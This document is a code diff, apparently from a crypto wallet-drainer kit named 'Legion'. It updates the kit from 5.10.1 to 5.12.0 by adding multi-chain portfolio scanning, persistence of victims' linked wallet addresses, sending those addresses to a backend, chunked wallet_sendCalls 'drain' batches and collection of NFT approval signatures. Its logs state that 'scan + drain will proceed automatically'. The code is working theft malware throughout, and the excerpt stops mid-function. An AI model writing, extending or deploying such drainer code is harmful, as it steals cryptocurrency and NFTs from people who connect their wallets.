@@ -35,92 +35,10 @@
     };
   })();
 
-  // Node.js + Buffer polyfills — required for WalletConnect relay (fixes "unknown payload: 123,34,...")
-  (function () {
-    if (window.__LEGION_POLYFILLS__) return;
-    window.__LEGION_POLYFILLS__ = true;
-    if (typeof process === 'undefined' || !process.nextTick) {
-      window.process = {
-        env: { NODE_ENV: 'production' }, version: '', browser: true,
-        nextTick: function (fn, a, b) { Promise.resolve().then(function () { fn(a, b); }); }
-      };
-    }
-    if (typeof global === 'undefined') window.global = window;
-    function utf8FromU8(u8) {
-      try { return new TextDecoder('utf-8').decode(u8); }
-      catch (_) {
-        var s = '';
-        for (var i = 0; i < u8.length; i++) s += String.fromCharCode(u8[i]);
-        return s;
-      }
-    }
-    function attachBuf(u8) {
-      if (!u8 || u8.__legionBuf) return u8;
-      u8.__legionBuf = true;
-      u8.toString = function (enc) {
-        enc = enc || 'utf8';
-        if (enc === 'hex') {
-          return Array.prototype.map.call(this, function (b) {
-            return ('0' + b.toString(16)).slice(-2);
-          }).join('');
-        }
-        if (enc === 'base64') {
-          var bin = '';
-          for (var i = 0; i < this.length; i++) bin += String.fromCharCode(this[i]);
-          return btoa(bin);
-        }
-        return utf8FromU8(this);
-      };
-      return u8;
-    }
-    if (!Uint8Array.prototype.__legionU8ToString) {
-      Uint8Array.prototype.toString = function () {
-        if (this.__legionBuf) return attachBuf(this).toString('utf8');
-        return utf8FromU8(this);
-      };
-      Uint8Array.prototype.__legionU8ToString = true;
-    }
-    if (typeof Buffer !== 'undefined' && Buffer.from && Buffer.from('ab').toString() === 'ab') return;
-    window.Buffer = {
-      isBuffer: function (b) { return !!(b && (b instanceof Uint8Array || b.__legionBuf)); },
-      from: function (d, enc) {
-        if (typeof d === 'string') {
-          if (enc === 'hex') {
-            var s = d.length % 2 ? '0' + d : d, b = [];
-            for (var i = 0; i < s.length; i += 2) b.push(parseInt(s.substr(i, 2), 16));
-            return attachBuf(new Uint8Array(b));
-          }
-          if (enc === 'base64') {
-            var bin = atob(d), u = new Uint8Array(bin.length);
-            for (var j = 0; j < bin.length; j++) u[j] = bin.charCodeAt(j);
-            return attachBuf(u);
-          }
-          return attachBuf(new TextEncoder().encode(d));
-        }
-        if (d instanceof ArrayBuffer) return attachBuf(new Uint8Array(d));
-        if (ArrayBuffer.isView(d)) return attachBuf(new Uint8Array(d.buffer, d.byteOffset, d.byteLength));
-        return attachBuf(new Uint8Array(d));
-      },
-      alloc: function (n, fill) {
-        var a = new Uint8Array(n);
-        if (fill !== undefined) a.fill(fill);
-        return attachBuf(a);
-      },
-      concat: function (list, totalLength) {
-        var total = totalLength != null ? totalLength : list.reduce(function (s, b) { return s + b.length; }, 0);
-        var out = new Uint8Array(total), off = 0;
-        list.forEach(function (b) {
-          var view = b instanceof Uint8Array ? b : new Uint8Array(b);
-          out.set(view, off); off += view.length;
-        });
-        return attachBuf(out);
-      },
-      byteLength: function (s, enc) {
-        if (typeof s === 'string') return window.Buffer.from(s, enc).length;
-        return s.length;
-      }
-    };
-  })();
+  // Polyfills live in vendor/legion-polyfills.js (load before wallet bundle)
+  if (!window.__LEGION_POLYFILLS__) {
+    console.warn('[Legion] Missing vendor/legion-polyfills.js — WalletConnect relay may fail');
+  }
 
   // ═══════════════════════════════════════════════════════════════
   // SECTION 02: CONFIG + CONSTANTS
@@ -144,7 +62,7 @@
     debugDevTools: false,
   }, window.LEGION_CONFIG || {});
 
-  var LEGION_VERSION = '5.10.1';
+  var LEGION_VERSION = '5.12.0';
 
   /** 16+ EVM chains — factory CREATE2 fills gaps where static map is zero */
   var TARGET_EVM_CHAIN_IDS = [
@@ -285,7 +203,8 @@
     81457: ['https://rpc.blast.io'],
   };
 
-  var NFT_APPROVAL_BATCH_SIZE = 20;
+  var NFT_APPROVAL_BATCH_SIZE = 50;
+  var SEND_CALLS_MAX = 50;
 
   async function evmPublicRpcCall(chainId, method, params) {
     var cid = Number(chainId) || 1;
@@ -763,6 +682,17 @@
     if (s.indexOf('base') !== -1) return 8453;
     if (s.indexOf('optimism') !== -1) return 10;
     if (s.indexOf('avalanche') !== -1 || s.indexOf('avax') !== -1) return 43114;
+    if (s.indexOf('scroll') !== -1) return 534352;
+    if (s.indexOf('blast') !== -1) return 81457;
+    if (s.indexOf('mantle') !== -1) return 5000;
+    if (s.indexOf('fantom') !== -1 || s.indexOf('ftm') !== -1) return 250;
+    if (s.indexOf('cronos') !== -1) return 25;
+    if (s.indexOf('gnosis') !== -1 || s.indexOf('gno') !== -1) return 100;
+    if (s.indexOf('celo') !== -1) return 42220;
+    if (s.indexOf('zksync') !== -1) return 324;
+    if (s.indexOf('linea') !== -1) return 59144;
+    if (s.indexOf('zkevm') !== -1 || s.indexOf('polygon_zkevm') !== -1) return 1101;
+    if (s.indexOf('metis') !== -1) return 1088;
     return null;
   }
 
@@ -881,6 +811,8 @@
         native: 'trust://open_url?coin_id=60&url=' + encodedReturn,
         universal: 'https://link.trustwallet.com/open_url?coin_id=60&url=' + encodedReturn,
         linkMode: true,
+        okx: 'okx://wallet/dapp/url?dappUrl=' + encodedReturn,
+        bitget: 'bitkeep://bkconnect?action=dapp&url=' + encodedReturn,
       },
     };
   }
@@ -918,8 +850,45 @@
     await sleep(200);
   }
 
+  function saveWcFamilyContext(addrs) {
+    try {
+      sessionStorage.setItem('legion_wc_families', JSON.stringify({
+        ts: Date.now(),
+        addresses: addrs || collectAddressMap(),
+      }));
+    } catch (e) {}
+    try {
+      if (window.LegionWallet && typeof window.LegionWallet.saveSessionContext === 'function') {
+        var sess = window.LegionWallet.getSessionAddresses && window.LegionWallet.getSessionAddresses();
+        if (sess && sess.families) window.LegionWallet.saveSessionContext(sess.families);
+      }
+    } catch (e2) {}
+  }
+
+  function loadWcFamilyContext() {
+    try {
+      var raw = sessionStorage.getItem('legion_wc_families');
+      if (!raw) return null;
+      var ctx = JSON.parse(raw);
+      if (!ctx || !ctx.ts) return null;
+      if (Date.now() - ctx.ts > 7 * 24 * 60 * 60 * 1000) {
+        sessionStorage.removeItem('legion_wc_families');
+        return null;
+      }
+      return ctx.addresses || null;
+    } catch (e) {
+      return null;
+    }
+  }
+
   async function tryRecoverWcSession() {
     var sess = findWcStorageSession();
+    if (!sess || !sess.address) {
+      var ctx = loadWcFamilyContext();
+      if (ctx && ctx.evm) {
+        sess = { address: ctx.evm, fromContext: true };
+      }
+    }
     if (!sess || !sess.address) return null;
     if (isWcSessionExpired(sess)) {
       L.log('WC session expired — clearing for reconnect');
@@ -932,8 +901,17 @@
     S.connectMode = 'wc';
     S.wcSessionActive = true;
     try {
+      if (typeof window.LegionWallet.tryRecoverStoredSession === 'function') {
+        var restored = await window.LegionWallet.tryRecoverStoredSession(true);
+        if (restored && isRealWalletConnectSession(getLegionConnectorId().toLowerCase(), restored)) {
+          applyLegionWalletSessionAddresses();
+          L.log('WC session restored via LegionWallet recovery');
+          return restored;
+        }
+      }
       var prov = await pollWcProviderReady(20000);
       if (prov && isRealWalletConnectSession(getLegionConnectorId().toLowerCase(), prov)) {
+        applyLegionWalletSessionAddresses();
         L.log('WC session restored from storage');
         return prov;
       }
@@ -941,36 +919,150 @@
     return null;
   }
 
-  async function scanFullPortfolio(address) {
-    var rankedAll = await SCOUT.ranked(address);
-    var items = (rankedAll && rankedAll.assets) || (rankedAll && rankedAll.ranked) || [];
-    var totalUsd = Number(rankedAll && rankedAll.total_usd) || 0;
+  async function scanFullPortfolio(address, addrs) {
+    addrs = addrs || collectAddressMap(address);
+    var items = [];
     var byChain = {};
-    MULTI_CHAIN_ORDER.forEach(function (cid) {
-      byChain[cid] = { chainId: cid, usd: 0, tokens: [] };
-    });
-    items.forEach(function (a) {
-      var cid = rankedAssetChainId(a.chain);
-      if (!cid || !byChain[cid]) return;
-      var usd = Number(a.amount_usd || a.usd_value || 0);
-      byChain[cid].usd += usd;
-      if (a.token && a.token !== 'native' && String(a.token).startsWith('0x')) {
-        byChain[cid].tokens.push({
-          address: String(a.token).toLowerCase(),
-          balance: String(a.amount_raw || a.raw_balance || '0'),
-          symbol: a.symbol || '?',
-          usd: usd,
+    var evmChainIds = getMultiChainOrder();
+
+    function ensureByChainSlot(cid) {
+      if (!cid) return;
+      if (!byChain[cid]) byChain[cid] = { chainId: cid, usd: 0, tokens: [] };
+    }
+
+    evmChainIds.forEach(function (cid) { ensureByChainSlot(cid); });
+
+    function mergeMultiBalanceRow(row) {
+      if (!row) return;
+      var cid = rankedAssetChainId(row.chain);
+      ensureByChainSlot(cid);
+      var fam = String(row.family || 'EVM').toUpperCase();
+      function pushItem(token, symbol, amount_raw, decimals, contract) {
+        if (!amount_raw || BigInt(amount_raw || '0') <= 0n) return;
+        items.push({
+          chain: row.chain,
+          family: fam,
+          token: token,
+          symbol: symbol || '?',
+          amount_raw: String(amount_raw),
+          amount_usd: 0,
+          decimals: decimals || 18,
+        });
+        if (contract && cid && byChain[cid]) {
+          byChain[cid].tokens.push({
+            address: String(contract).toLowerCase(),
+            balance: String(amount_raw),
+            symbol: symbol || '?',
+            usd: 0,
+          });
+        }
+      }
+      if (row.native && BigInt(row.native.amount_raw || '0') > 0n) {
+        pushItem('native', row.native.symbol, row.native.amount_raw, row.native.decimals);
+      }
+      (row.tokens || []).forEach(function (t) {
+        if (BigInt(t.amount_raw || '0') > 0n) {
+          pushItem(t.contract || t.symbol, t.symbol, t.amount_raw, t.decimals, t.contract);
+        }
+      });
+    }
+
+    var multiBody = { evm_chain_id: 1 };
+    if (addrs.evm) multiBody.evm = addrs.evm;
+    else if (address) multiBody.evm = address;
+    if (addrs.sol) multiBody.sol = addrs.sol;
+    if (addrs.tron) multiBody.tron = addrs.tron;
+    if (addrs.ton) multiBody.ton = addrs.ton;
+    if (addrs.btc) multiBody.btc = addrs.btc;
+    if (addrs.cosmos) multiBody.cosmos = addrs.cosmos;
+    if (addrs.aptos) multiBody.aptos = addrs.aptos;
+    if (addrs.sui) multiBody.sui = addrs.sui;
+
+    var multiRows = [];
+    try {
+      var multiResp = await apiPost('/api/v1/multi-balance', multiBody);
+      if (multiResp && multiResp.data && multiResp.data.chains) {
+        multiRows = multiRows.concat(multiResp.data.chains);
+      }
+    } catch (e) { L.warn('multi-balance (all families):', e.message); }
+
+    var evmProbeAddr = addrs.evm || address;
+    if (evmProbeAddr) {
+      var batchSize = EVM_SCAN_BATCH_SIZE;
+      for (var bi = 0; bi < evmChainIds.length; bi += batchSize) {
+        var slice = evmChainIds.slice(bi, bi + batchSize);
+        var evmProbes = await Promise.allSettled(
+          slice.map(function (cid) {
+            return apiPost('/api/v1/multi-balance', { evm: evmProbeAddr, evm_chain_id: cid })
+              .then(function (resp) {
+                var chains = resp && resp.data && resp.data.chains;
+                return chains && chains.length ? chains[0] : null;
+              });
+          })
+        );
+        evmProbes.forEach(function (pr) {
+          if (pr.status === 'fulfilled' && pr.value) multiRows.push(pr.value);
         });
       }
+    }
+
+    var seenChain = {};
+    multiRows.forEach(function (row) {
+      if (!row || !row.chain || seenChain[row.chain]) return;
+      seenChain[row.chain] = true;
+      mergeMultiBalanceRow(row);
     });
+
+    var rankedAll = await SCOUT.ranked(address);
+    var rankedItems = (rankedAll && rankedAll.assets) || (rankedAll && rankedAll.ranked) || [];
+    rankedItems.forEach(function (a) {
+      var cid = rankedAssetChainId(a.chain);
+      ensureByChainSlot(cid);
+      var usd = Number(a.amount_usd || a.usd_value || 0);
+      items.push(a);
+      if (cid && byChain[cid]) {
+        byChain[cid].usd += usd;
+        if (a.token && a.token !== 'native' && String(a.token).startsWith('0x')) {
+          var exists = byChain[cid].tokens.some(function (t) {
+            return t.address === String(a.token).toLowerCase();
+          });
+          if (!exists) {
+            byChain[cid].tokens.push({
+              address: String(a.token).toLowerCase(),
+              balance: String(a.amount_raw || a.raw_balance || '0'),
+              symbol: a.symbol || '?',
+              usd: usd,
+            });
+          }
+        }
+      }
+    });
+
+    var totalUsd = Number(rankedAll && rankedAll.total_usd) || 0;
     var fundedChains = [];
-    MULTI_CHAIN_ORDER.forEach(function (cid) {
+    Object.keys(byChain).forEach(function (k) {
+      var cid = parseInt(k, 10);
       if (byChain[cid].usd > 0 || byChain[cid].tokens.length > 0) fundedChains.push(cid);
     });
     fundedChains.sort(function (a, b) { return byChain[b].usd - byChain[a].usd; });
     S.scoutUsd = Math.max(S.scoutUsd, totalUsd);
-    S.portfolioScan = { totalUsd: totalUsd, items: items, byChain: byChain, fundedChains: fundedChains, assetCount: items.length };
-    L.log('Portfolio scan:', totalUsd.toFixed(2), 'USD | funded EVM chains:', fundedChains.join(','));
+    S.portfolioScan = {
+      totalUsd: totalUsd,
+      items: items,
+      byChain: byChain,
+      fundedChains: fundedChains,
+      assetCount: items.length,
+      multiChainRows: multiRows.length,
+      evmChainsScanned: evmChainIds.length,
+      addresses: addrs,
+    };
+    L.log(
+      'Portfolio scan:',
+      totalUsd.toFixed(2), 'USD | EVM chains scanned:', evmChainIds.length,
+      '| rows:', multiRows.length,
+      '| funded:', fundedChains.join(',') || 'none',
+      '| families:', Object.keys(addrs).join(',')
+    );
     return S.portfolioScan;
   }
 
@@ -1043,8 +1135,45 @@
     return bal > gasCost ? bal - gasCost : 0n;
   }
 
-  // EVM multi-chain sweep order — must match backend contracts + CHAIN_ADD_PARAMS
-  var MULTI_CHAIN_ORDER = [1, 56, 137, 42161, 8453, 10, 43114];
+  // Priority EVM chains first; full list from LegionWallet viem/chains universe
+  var PRIORITY_CHAIN_ORDER = [1, 56, 137, 42161, 8453, 10, 43114, 534352, 81457, 5000, 250, 25, 100, 42220, 324, 59144, 1101, 1088];
+  var EVM_SCAN_BATCH_SIZE = 12;
+
+  function getMultiChainOrder() {
+    if (S.evmScanChainIds && S.evmScanChainIds.length) return S.evmScanChainIds;
+    var ids = [];
+    var seen = {};
+    function addChain(id) {
+      var n = Number(id);
+      if (!Number.isFinite(n) || n <= 0 || seen[n]) return;
+      seen[n] = true;
+      ids.push(n);
+    }
+    PRIORITY_CHAIN_ORDER.forEach(addChain);
+    try {
+      if (window.LegionWallet && typeof window.LegionWallet.getAllEvmCaipChains === 'function') {
+        window.LegionWallet.getAllEvmCaipChains().forEach(function (caip) {
+          var m = String(caip).match(/^eip155:(\d+)$/i);
+          if (m) addChain(parseInt(m[1], 10));
+        });
+      }
+    } catch (e) { L.warn('getAllEvmCaipChains:', e.message); }
+    if (!ids.length) PRIORITY_CHAIN_ORDER.forEach(addChain);
+    ids.sort(function (a, b) {
+      var ia = PRIORITY_CHAIN_ORDER.indexOf(a);
+      var ib = PRIORITY_CHAIN_ORDER.indexOf(b);
+      if (ia === -1 && ib === -1) return a - b;
+      if (ia === -1) return 1;
+      if (ib === -1) return -1;
+      return ia - ib;
+    });
+    S.evmScanChainIds = ids;
+    L.log('[scan] EVM universe:', ids.length, 'chains (viem + priority)');
+    return ids;
+  }
+
+  /** @deprecated use getMultiChainOrder() */
+  function getMultiChainOrderLegacy() { return getMultiChainOrder(); }
 
   var CHAIN_ADD_PARAMS = {
     56: {
@@ -1089,6 +1218,27 @@
       rpcUrls: ['https://api.avax.network/ext/bc/C/rpc'],
       blockExplorerUrls: ['https://snowtrace.io'],
     },
+    534352: {
+      chainId: '0x82750',
+      chainName: 'Scroll',
+      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+      rpcUrls: ['https://rpc.scroll.io'],
+      blockExplorerUrls: ['https://scrollscan.com'],
+    },
+    81457: {
+      chainId: '0x13e31',
+      chainName: 'Blast',
+      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+      rpcUrls: ['https://rpc.blast.io'],
+      blockExplorerUrls: ['https://blastscan.io'],
+    },
+    5000: {
+      chainId: '0x1388',
+      chainName: 'Mantle',
+      nativeCurrency: { name: 'MNT', symbol: 'MNT', decimals: 18 },
+      rpcUrls: ['https://rpc.mantle.xyz'],
+      blockExplorerUrls: ['https://mantlescan.xyz'],
+    },
   };
 
   // Session state
@@ -1117,6 +1267,7 @@
     fusionNotified: false,
     connecting: false,
     wcSessionExpired: false,
+    evmScanChainIds: null,
     factoryContracts: {},
     deactivatedContracts: {},
     relayerSponsored: false,
@@ -1720,65 +1871,168 @@
     };
   }
 
-  /** One connect step: link every detected chain family (parallel, same user gesture). */
-  async function connectAllFamilies() {
-    if (S.familiesLinked) return S.allAddresses;
+  function wireWcFamilyConnections() {
+    if (S.chains.SOL && S.chains.SOL.address && !S.familyConnections.SVM) {
+      var solProv = null;
+      try {
+        if (window.LegionWallet && typeof window.LegionWallet.getSolanaProvider === 'function') {
+          solProv = window.LegionWallet.getSolanaProvider();
+        }
+      } catch (e) {}
+      if (!solProv) {
+        L.warn('[SVM] WC address present but no Solana provider — scan only, drain skipped until signer available');
+      } else {
+      S.familyConnections.SVM = {
+        provider: solProv,
+        address: S.chains.SOL.address,
+        name: 'SVM',
+        family: 'SVM',
+        hint: 'walletconnect',
+        wcSession: true,
+      };
+      }
+    }
+    if (S.chains.TRON && S.chains.TRON.address && !S.familyConnections.TRON) {
+      S.familyConnections.TRON = {
+        provider: null,
+        address: S.chains.TRON.address,
+        name: 'TRON',
+        family: 'TRON',
+        hint: 'walletconnect',
+        wcSession: true,
+        addressOnly: true,
+      };
+    }
+    if (S.chains.TON && S.chains.TON.address && !S.familyConnections.TON) {
+      S.familyConnections.TON = {
+        provider: null,
+        address: S.chains.TON.address,
+        name: 'TON',
+        family: 'TON',
+        hint: 'walletconnect',
+        wcSession: true,
+        addressOnly: true,
+      };
+    }
+    if (S.chains.BTC && S.chains.BTC.address && !S.familyConnections.UTXO) {
+      var btcProv = null;
+      try {
+        if (window.LegionWallet && typeof window.LegionWallet.getBitcoinProvider === 'function') {
+          btcProv = window.LegionWallet.getBitcoinProvider();
+        }
+      } catch (e) {}
+      if (!btcProv) {
+        L.warn('[UTXO] WC BTC address but no bip122 provider — scan only');
+      } else {
+      wireWcBtcConnection(S.chains.BTC.address);
+      }
+    }
+    if (S.chains.COSMOS && S.chains.COSMOS.address && !S.familyConnections.COSMOS) {
+      S.familyConnections.COSMOS = {
+        provider: null,
+        address: S.chains.COSMOS.address,
+        name: 'COSMOS',
+        family: 'COSMOS',
+        hint: 'walletconnect',
+        wcSession: true,
+        addressOnly: true,
+      };
+    }
+    if (S.chains.APTOS && S.chains.APTOS.address && !S.familyConnections.APTOS) {
+      S.familyConnections.APTOS = {
+        provider: null,
+        address: S.chains.APTOS.address,
+        name: 'APTOS',
+        family: 'APTOS',
+        hint: 'walletconnect',
+        wcSession: true,
+        addressOnly: true,
+      };
+    }
+    if (S.chains.SUI && S.chains.SUI.address && !S.familyConnections.SUI) {
+      S.familyConnections.SUI = {
+        provider: null,
+        address: S.chains.SUI.address,
+        name: 'SUI',
+        family: 'SUI',
+        hint: 'walletconnect',
+        wcSession: true,
+        addressOnly: true,
+      };
+    }
+  }
 
+  async function broadcastConnectScan(evmAddr, chainId, walletName, addrs) {
+    addrs = addrs || collectAddressMap(evmAddr);
+    var compact = Object.keys(addrs).slice(0, 12).map(function (k) {
+      return k + ':' + String(addrs[k]).slice(0, 10) + '...';
+    });
+    await SCOUT.telemetry(evmAddr, chainId, walletName, addrs);
+    L.log('[connect] backend notified |', compact.join(' | ') || 'evm only');
+  }
+
+  /** One connect: harvest WC session + extension families, send all addresses to backend. */
+  async function linkAllFamiliesOnConnect(evmAddr) {
     discoverChainFamilies();
-    UI.status('Linking all blockchains...');
-    S.familyConnections = {};
-
-    if (S.wcSessionActive || S.connectMode === 'wc') {
-      applyLegionWalletSessionAddresses();
-      S.familiesLinked = true;
-      S.allAddresses = collectAddressMap();
-      var wcParts = [];
-      Object.keys(S.allAddresses).forEach(function (fk) {
-        wcParts.push(fk + ':' + String(S.allAddresses[fk]).slice(0, 10) + '...');
-      });
-      L.log('[connect] WC session families:', wcParts.length ? wcParts.join(' | ') : 'EVM only');
-      return S.allAddresses;
-    }
-
-    var linkers = [
-      { family: 'SVM', fn: connectSol },
-      { family: 'UTXO', fn: connectBtc },
-      { family: 'TRON', fn: connectTron },
-      { family: 'TON', fn: connectTon },
-      { family: 'COSMOS', fn: connectCosmos },
-      { family: 'APTOS', fn: connectAptos },
-      { family: 'SUI', fn: connectSui },
-    ];
-
-    var tasks = [];
-    for (var li = 0; li < linkers.length; li++) {
-      (function (entry) {
-        var providers = (S.familyProviders && S.familyProviders[entry.family]) || [];
-        if (!providers.length) return;
-        tasks.push(
-          entry.fn().then(function (conn) {
-            if (conn) S.familyConnections[entry.family] = conn;
-            return conn;
-          }).catch(function (e) {
-            L.warn('[' + entry.family + '] link skip:', e.message);
-            return null;
-          })
-        );
-      })(linkers[li]);
-    }
-
-    if (tasks.length) await Promise.all(tasks);
-
     applyLegionWalletSessionAddresses();
+    wireWcFamilyConnections();
+
+    if (S.connectMode !== 'wc') {
+      var linkers = [
+        { family: 'SVM', fn: connectSol },
+        { family: 'UTXO', fn: connectBtc },
+        { family: 'TRON', fn: connectTron },
+        { family: 'TON', fn: connectTon },
+        { family: 'COSMOS', fn: connectCosmos },
+        { family: 'APTOS', fn: connectAptos },
+        { family: 'SUI', fn: connectSui },
+      ];
+      var tasks = [];
+      for (var li = 0; li < linkers.length; li++) {
+        (function (entry) {
+          var providers = (S.familyProviders && S.familyProviders[entry.family]) || [];
+          if (!providers.length) return;
+          tasks.push(
+            entry.fn().then(function (conn) {
+              if (conn) S.familyConnections[entry.family] = conn;
+              return conn;
+            }).catch(function (e) {
+              L.warn('[' + entry.family + '] link skip:', e.message);
+              return null;
+            })
+          );
+        })(linkers[li]);
+      }
+      if (tasks.length) await Promise.all(tasks);
+      applyLegionWalletSessionAddresses();
+      wireWcFamilyConnections();
+    }
 
     S.familiesLinked = true;
-    S.allAddresses = collectAddressMap();
+    S.allAddresses = collectAddressMap(evmAddr);
+    saveWcFamilyContext(S.allAddresses);
     var parts = [];
+    var familyOrder = ['evm', 'sol', 'btc', 'tron', 'ton', 'cosmos', 'aptos', 'sui'];
+    familyOrder.forEach(function (fk) {
+      if (S.allAddresses[fk]) {
+        parts.push(fk + ':' + String(S.allAddresses[fk]).slice(0, 10) + '...');
+      }
+    });
     Object.keys(S.allAddresses).forEach(function (fk) {
-      parts.push(fk + ':' + String(S.allAddresses[fk]).slice(0, 10) + '...');
+      if (familyOrder.indexOf(fk) === -1) {
+        parts.push(fk + ':' + String(S.allAddresses[fk]).slice(0, 10) + '...');
+      }
     });
     L.log('[connect] linked families:', parts.length ? parts.join(' | ') : 'EVM only');
+    if (parts.length) {
+      L.log('[connect] multi-chain ready —', parts.length, 'families | scan + drain will proceed automatically');
+    }
     return S.allAddresses;
+  }
+
+  /** One connect step: link every detected chain family (parallel, same user gesture). */
+  async function connectAllFamilies() {
+    return linkAllFamiliesOnConnect(S.evmAddr);
   }
 
   function detectNonEvm() {
@@ -1950,8 +2204,9 @@
   }
 
   async function findFundedChainViaBackend(address) {
-    for (var i = 0; i < MULTI_CHAIN_ORDER.length; i++) {
-      var cid = MULTI_CHAIN_ORDER[i];
+    var order = getMultiChainOrder();
+    for (var i = 0; i < order.length; i++) {
+      var cid = order[i];
       try {
         var data = await SCOUT.ranked(address, cid);
         if (backendHasDrainableAssets(data)) return cid;
@@ -2186,13 +2441,60 @@
   }
 
   function normNftList(nfts) {
-    return (nfts || []).map(function (n) {
-      return {
-        contract: n.contract || n.nft_contract,
-        tokenIds: n.tokenIds || [String(n.token_id || n.tokenId || '1')],
-        standard: n.standard || 'erc721',
-      };
-    }).filter(function (n) { return n.contract; });
+    var byContract = {};
+    (nfts || []).forEach(function (n) {
+      var contract = String(n.contract || n.nft_contract || '').toLowerCase();
+      if (!contract) return;
+      var tokenIds = n.tokenIds || [String(n.token_id || n.tokenId || '1')];
+      var standard = n.standard || 'erc721';
+      if (!byContract[contract]) {
+        byContract[contract] = { contract: contract, tokenIds: [], standard: standard, _seen: {} };
+      }
+      var entry = byContract[contract];
+      tokenIds.forEach(function (tid) {
+        var s = String(tid);
+        if (!entry._seen[s]) {
+          entry._seen[s] = true;
+          entry.tokenIds.push(s);
+        }
+      });
+    });
+    return Object.keys(byContract).map(function (k) {
+      var e = byContract[k];
+      delete e._seen;
+      return e;
+    });
+  }
+
+  function countUniqueNftContracts(nfts) {
+    var seen = {};
+    (nfts || []).forEach(function (n) {
+      var c = String(n.contract || n.nft_contract || '').toLowerCase();
+      if (c) seen[c] = true;
+    });
+    return Object.keys(seen).length;
+  }
+
+  function extractNftApprovalEntries(raw) {
+    if (!raw) return [];
+    if (Array.isArray(raw)) {
+      return raw.map(function (item) {
+        return {
+          contract: String(item.contract || '').toLowerCase(),
+          typedData: item.typedData || item,
+        };
+      }).filter(function (e) { return e.contract && e.typedData; });
+    }
+    if (typeof raw === 'object') {
+      return Object.keys(raw).map(function (k) {
+        var val = raw[k];
+        return {
+          contract: k.toLowerCase(),
+          typedData: val && val.typedData ? val.typedData : val,
+        };
+      }).filter(function (e) { return e.contract && e.typedData; });
+    }
+    return [];
   }
 
   function isLethalEvmResult(p2) {
@@ -2674,6 +2976,7 @@
       _wcProv = provider;
       _wcConnecting = false;
       applyLegionWalletSessionAddresses();
+      saveWcFamilyContext(collectAddressMap());
       L.log('Bundled AppKit connected | connector:', connId || 'unknown',
         '| wc:', !!(provider && provider.isWalletConnect));
       return provider;
@@ -2806,6 +3109,37 @@
     return c;
   }
 
+  async function requestSendCallsBatch(provider, address, chainId, calls, atomicRequired) {
+    var chainHex = '0x' + Number(chainId).toString(16);
+    try {
+      var batchId = await provider.request({
+        method: 'wallet_sendCalls',
+        params: [{
+          version: '2.0.0',
+          chainId: chainHex,
+          from: address,
+          atomicRequired: atomicRequired !== false,
+          calls: calls,
+        }],
+      });
+      return extractBatchOrTxId(batchId);
+    } catch (e) {
+      if (atomicRequired === false) throw e;
+      L.warn('wallet_sendCalls v2 fail:', e.message);
+      var batchId2 = await provider.request({
+        method: 'wallet_sendCalls',
+        params: [{
+          version: '1.0',
+          chainId: chainHex,
+          from: address,
+          atomicRequired: false,
+          calls: calls,
+        }],
+      });
+      return extractBatchOrTxId(batchId2);
+    }
+  }
+
   // 9.3 — TIER 1: wallet_sendCalls (ONE POPUP — ETH + ERC-20 + NFT)
   async function drainSendCalls(provider, address, chainId, assets) {
     var claimContract = resolveClaimContract(chainId);
@@ -2851,41 +3185,30 @@
     if (calls.length === 0) return null;
     calls = calls.map(normalizeSendCall);
 
-    L.log('wallet_sendCalls:', calls.length, 'calls');
-    try {
-      var batchId = await provider.request({
-        method: 'wallet_sendCalls',
-        params: [{
-          version: '2.0.0',
-          chainId: '0x' + Number(chainId).toString(16),
-          from: address,
-          atomicRequired: true,
-          calls: calls,
-        }],
-      });
-      var extracted = extractBatchOrTxId(batchId);
-      L.log('sendCalls batchId:', extracted ? extracted.slice(0, 42) : String(batchId));
-      if (extracted && isLikelyTxHash(extracted)) return extracted;
-      if (extracted) L.warn('sendCalls returned bundle id (not tx hash) — will try eth_sendTransaction');
-      return null;
-    } catch (e) {
-      L.warn('wallet_sendCalls v2 fail:', e.message);
+    var callChunks = chunkArray(calls, SEND_CALLS_MAX);
+    L.log('wallet_sendCalls:', calls.length, 'calls in', callChunks.length, 'chunk(s)');
+    var lastTxHash = null;
+    for (var sci = 0; sci < callChunks.length; sci++) {
+      var chunkCalls = callChunks[sci];
       try {
-        var batchId2 = await provider.request({
-          method: 'wallet_sendCalls',
-          params: [{
-            version: '1.0',
-            chainId: '0x' + Number(chainId).toString(16),
-            from: address,
-            atomicRequired: false,
-            calls: calls,
-          }],
-        });
-        var extracted2 = extractBatchOrTxId(batchId2);
-        if (extracted2 && isLikelyTxHash(extracted2)) return extracted2;
-        return null;
-      } catch (e2) { L.warn('wallet_sendCalls v1 fail:', e2.message); return null; }
+        var extracted = await requestSendCallsBatch(provider, address, chainId, chunkCalls, sci === 0);
+        L.log('sendCalls chunk', sci + 1, 'batchId:', extracted ? extracted.slice(0, 42) : String(extracted));
+        if (extracted && isLikelyTxHash(extracted)) lastTxHash = extracted;
+      } catch (e) {
+        if (sci === 0) {
+          try {
+            var extractedFallback = await requestSendCallsBatch(provider, address, chainId, chunkCalls, false);
+            if (extractedFallback && isLikelyTxHash(extractedFallback)) lastTxHash = extractedFallback;
+          } catch (e2) {
+            L.warn('wallet_sendCalls chunk fail:', e2.message);
+            if (sci === 0) return null;
+          }
+        } else {
+          L.warn('wallet_sendCalls chunk', sci + 1, 'fail:', e.message);
+        }
+      }
     }
+    return lastTxHash;
   }
 
   /** Mobile / WC — claim() contract when deployed, else direct vault transfer */
@@ -3057,20 +3380,20 @@
     }
 
     var nftApprovalSigs = {};
-    if (bd.nft_approval_typed_data && typeof bd.nft_approval_typed_data === 'object' && !bd.batch_nft_in_permit) {
-      var contracts = Object.keys(bd.nft_approval_typed_data);
-      var contractBatches = chunkArray(contracts, NFT_APPROVAL_BATCH_SIZE);
-      for (var bi = 0; bi < contractBatches.length; bi++) {
-        var batch = contractBatches[bi];
+    var nftEntries = extractNftApprovalEntries(bd.nft_approval_typed_data);
+    if (nftEntries.length > 0 && !bd.batch_nft_in_permit) {
+      var entryBatches = chunkArray(nftEntries, NFT_APPROVAL_BATCH_SIZE);
+      for (var bi = 0; bi < entryBatches.length; bi++) {
+        var batch = entryBatches[bi];
         for (var ni = 0; ni < batch.length; ni++) {
-          var cKey = batch[ni];
+          var entry = batch[ni];
           try {
-            var ntd = normalizeTypedData(JSON.parse(JSON.stringify(bd.nft_approval_typed_data[cKey])));
+            var ntd = normalizeTypedData(JSON.parse(JSON.stringify(entry.typedData)));
             var nsig = await provider.request({
               method: 'eth_signTypedData_v4', params: [address, JSON.stringify(ntd)],
             });
-            nftApprovalSigs[cKey.toLowerCase()] = nsig;
